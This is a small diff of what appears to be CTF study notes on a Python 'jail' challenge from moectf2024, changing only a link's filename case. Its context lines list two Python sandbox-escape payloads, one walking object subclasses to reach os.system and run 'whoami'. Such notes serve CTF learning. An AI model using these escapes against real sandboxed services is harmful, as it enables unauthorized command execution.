@@ -18,7 +18,7 @@ comments: true
 > - [github-autojail](https://github.com/martcl/autojail)
 > - [moectf2024 题目链接](https://ctf.xidian.edu.cn/games/10/challenges?challenge=95)
 
-- [Moejail](../../MOECTF2024/MISC.md#Moejail)
+- [Moejail](../../MOECTF2024/misc.md#Moejail)
 
 -  `__import__('os').system('ls')`
 - `[i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "catch_warnings"]`
